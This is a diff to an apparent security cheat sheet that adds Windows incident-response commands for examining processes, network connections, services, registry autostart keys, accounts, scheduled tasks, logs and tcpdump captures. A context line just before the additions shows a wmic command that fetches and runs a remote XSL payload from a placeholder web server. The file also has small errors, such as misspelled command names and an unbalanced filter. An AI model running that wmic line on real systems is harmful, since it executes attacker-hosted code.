@@ -33,4 +33,81 @@
 
 ```wmic os get /format:"https://webserver/payload.xsl"```
 
+## Examining Processes with WMIC:
 
+```
+wmic process list full
+wmic process list brief
+wmic process get name, parentprocessid,processid
+wmic process where processid=pid get commandline
+```
+
+## Examining Network Usage:
+
+```
+netstat -na
+netstat -naob
+netstat -naob 5
+netsh advfirewall show currentprofile
+```
+
+## Examining Services:
+
+```
+services.msc
+net start
+sc query | more
+tasklist /svc
+```
+
+## Examining the Registry:
+
+```
+regedit
+reg query <regkey>
+
+# Potential Autostart Entry Points to Enumerate
+
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOncEx
+
+# NOTE: Inspect both HKCU and HKLM
+```
+
+## Examining Unusual Accounts:
+
+```
+lusrmgr.msc
+net user
+net localgroup <group>
+```
+
+## Examining Unusual Scheduled Tasks:
+
+```
+schtasks
+```
+
+## Eamining Unusual Log Entries:
+
+```
+wevutil qe security /f:text
+Get-EventLog -LogName Security | Format-List -Property *
+```
+
+## TCPDump
+
+```
+tcpdump -i <interface> # Capture, can use "any" 
+tcpdump -i <interface> -w <file> # Write to a file after capture
+tcpdump -r <file> -n # Read from a file and don't resolve hosts and ports
+tcpdump -r <file> -n -A # Read from a file and don't resolve hosts and ports, show as ASCII
+
+# Berkeley Packet Filtering
+
+tcpdump -r <file> 'host 8.8.8.8'
+tcpdump -r <file> 'src host 8.8.8.8'
+tcpdump -r <file> 'not src host 8.8.8.8'
+tcpdump -r <file> 'icmp and (src host 8.8.8.8'
+```
